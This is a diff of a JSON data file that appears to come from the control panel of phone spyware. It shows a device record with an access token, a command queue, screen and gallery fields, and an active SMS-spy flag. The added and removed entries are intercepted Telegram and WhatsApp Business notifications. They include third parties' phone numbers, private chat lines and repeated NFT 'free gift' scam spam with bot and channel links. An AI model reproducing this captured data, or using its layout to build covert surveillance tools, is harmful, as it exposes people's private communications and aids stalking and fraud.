@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632372048,
+    "lastSeen": 1775632375109,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632376100
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "10 new messages from 10 chats",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632375939
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632373567
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632373408
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Tu",
+        "time": "08/04 14:12",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632373207
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4286,46 +4326,6 @@
         "time": "08/04 13:32",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775629948036
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 831-9494-3474",
-        "content": "Yahhh",
-        "time": "08/04 13:32",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629947891
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "okk",
-        "time": "08/04 13:32",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629936654
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "okk",
-        "time": "08/04 13:32",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775629936585
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
-        "content": "gass kan lagi free gift nft\nhttp://t.me/nft/PoolFloat-37532\n\ncara ikuti? \n- /start bot\n- share bot+channel\n- follow channel: https://t.me/BELIIIGIFTT\nhttps://t.me/MerchantTgGift\n\n\nshare kan bot:\n@appsPrermmm_bot\n@appremmshaca_bot",
-        "time": "08/04 13:31",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629895564
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
-        "content": "gass kan lagi free gift nft\nhttp://t.me/nft/PoolFloat-37532\n\ncara ikuti? \n- /start bot\n- share bot+channel\n- follow channel: https://t.me/BELIIIGIFTT\nhttps://t.me/MerchantTgGift\n\n\nshare kan bot:\n@appsPrermmm_bot\n@appremmshaca_bot",
-        "time": "08/04 13:31",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629895560
       }
     ],
     "galleryPhotos": [],
